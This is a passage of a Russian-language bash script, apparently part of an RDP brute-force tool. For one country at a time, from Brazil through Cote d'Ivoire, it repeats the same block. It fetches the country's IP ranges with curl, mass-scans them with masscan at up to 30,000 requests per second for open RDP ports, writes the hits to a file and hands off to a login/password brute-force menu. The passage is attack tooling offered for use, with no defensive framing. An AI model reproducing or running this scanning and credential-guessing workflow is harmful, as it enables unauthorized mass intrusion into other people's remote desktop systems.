trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "28" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BRAZIL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Brazil://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "29" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BRITISH+INDIAN+OCEAN+TERRITORY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/British Indian Ocean Territory://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "30" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BRUNEI+DARUSSALAM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Brunei Darussalam://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "31" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BULGARIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bulgaria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "32" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BURKINA+FASO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Burkina Faso://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "33" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BURUNDI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Burundi://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "34" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CAMBODIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cambodia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "35" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CAMEROON |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cameroon://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "36" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CANADA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Canada://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "37" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CAYMAN+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cayman Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "38" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CENTRAL+AFRICAN+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Central African Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "39" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CHILE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Chile://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "40" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CHINA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/China://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "41" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COLOMBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Colombia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "42" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CONGO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Congo://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "43" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COOK+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cook Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "44" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COSTA+RICA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Costa Rica://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "45" ]; then
curl http://services.ce3c.be/ciprg/?countrys=COTE+D%27IVOIRE|grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cote D'ivoire://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
